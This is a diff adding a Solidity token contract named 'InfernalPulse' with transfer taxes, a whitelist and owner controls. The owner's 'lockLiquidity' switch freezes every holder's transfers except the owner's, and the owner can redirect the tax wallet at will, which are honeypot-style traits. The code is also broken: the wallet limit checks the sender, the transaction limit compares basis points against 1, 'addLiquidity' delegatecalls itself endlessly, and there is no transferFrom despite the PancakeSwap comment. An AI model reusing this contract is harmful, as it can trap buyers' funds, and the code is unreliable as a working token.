@@ -1,0 +1,119 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+contract InfernalPulse {
+    string public constant name = "InfernalPulse";
+    string public constant symbol = "INF";
+    uint8 public constant decimals = 18;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => bool) public whitelist;
+    mapping(address => uint256) public lastTransactionTime;
+    address public owner;
+    address public taxWallet;
+    uint256 private constant BUY_TAX_PERCENTAGE = 5;
+    uint256 private constant SELL_TAX_PERCENTAGE = 5;
+    uint256 private constant MAX_TRANSACTION_PERCENTAGE = 1;
+    uint256 private MAX_WALLET_PERCENTAGE = 1; // Maximum wallet limit set to 1%
+    bool private liquidityLocked;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    constructor() {
+        totalSupply = 10000000000 * 10**uint256(decimals);
+        balanceOf[msg.sender] = totalSupply;
+        owner = 0x5905489a82C26E06a620bd4901b3856E59bB3717;
+        taxWallet = 0x14b7170Ad9d3DEE6Ec5532eFA852fDF44b8EA0a0;
+        liquidityLocked = false;
+    }
+
+    modifier liquidityLock() {
+        require(liquidityLocked == false || msg.sender == owner, "Liquidity is locked");
+        _;
+    }
+
+    modifier walletLimit(address _address, uint256 _amount) {
+        require(balanceOf[_address] + _amount <= totalSupply * MAX_WALLET_PERCENTAGE / 100, "Wallet balance would exceed maximum limit");
+        _;
+    }
+
+    function transfer(address to, uint256 amount) external liquidityLock walletLimit(msg.sender, amount) {
+        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
+        require(whitelist[to] || calculatePercentage(amount, totalSupply) <= MAX_TRANSACTION_PERCENTAGE, "Transaction amount exceeds maximum limit");
+
+        uint256 taxAmount = calculateTax(amount);
+        uint256 transferAmount = amount - taxAmount;
+
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += transferAmount;
+        balanceOf[taxWallet] += taxAmount;
+
+        emit Transfer(msg.sender, to, transferAmount);
+        emit Transfer(msg.sender, taxWallet, taxAmount);
+
+        lastTransactionTime[msg.sender] = block.timestamp;
+    }
+
+    function calculateTax(uint256 amount) internal view returns (uint256) {
+        if (msg.sender == owner) {
+            return (amount * SELL_TAX_PERCENTAGE) / 100;
+        } else {
+            return (amount * BUY_TAX_PERCENTAGE) / 100;
+        }
+    }
+
+    function renounceOwnership() external {
+        require(msg.sender == owner, "Only the owner can renounce ownership");
+        owner = address(0);
+    }
+
+    function setTaxWallet(address _taxWallet) external {
+        require(msg.sender == owner, "Only the owner can set the tax wallet");
+        taxWallet = _taxWallet;
+    }
+
+    function addToWhitelist(address[] memory addresses) external {
+        require(msg.sender == owner, "Only the owner can add addresses to the whitelist");
+
+        for (uint256 i = 0; i < addresses.length; i++) {
+            address addr = addresses[i];
+            whitelist[addr] = true;
+        }
+    }
+
+    function removeFromWhitelist(address[] memory addresses) external {
+        require(msg.sender == owner, "Only the owner can remove addresses from the whitelist");
+
+        for (uint256 i = 0; i < addresses.length; i++) {
+            address addr = addresses[i];
+            whitelist[addr] = false;
+        }
+    }
+
+    function calculatePercentage(uint256 amount, uint256 total) internal pure returns (uint256) {
+        return (amount * 10000) / total; // multiplied by 10000 to keep 2 decimal places
+    }
+
+    function lockLiquidity() external {
+        require(msg.sender == owner, "Only the owner can lock liquidity");
+        liquidityLocked = true;
+    }
+
+    function unlockLiquidity() external {
+        require(msg.sender == owner, "Only the owner can unlock liquidity");
+        liquidityLocked = false;
+    }
+    
+    function setMaxWalletPercentage(uint256 percentage) external {
+        require(msg.sender == owner, "Only the owner can set the maximum wallet percentage");
+        require(percentage > 0 && percentage <= 100, "Invalid percentage value");
+        MAX_WALLET_PERCENTAGE = percentage;
+    }
+
+    // Add the following function to enable interaction with PancakeSwap
+
+    function addLiquidity() external payable {
+        (bool success,) = address(this).delegatecall(msg.data);
+        require(success, "Delegatecall failed");
+    }
+}
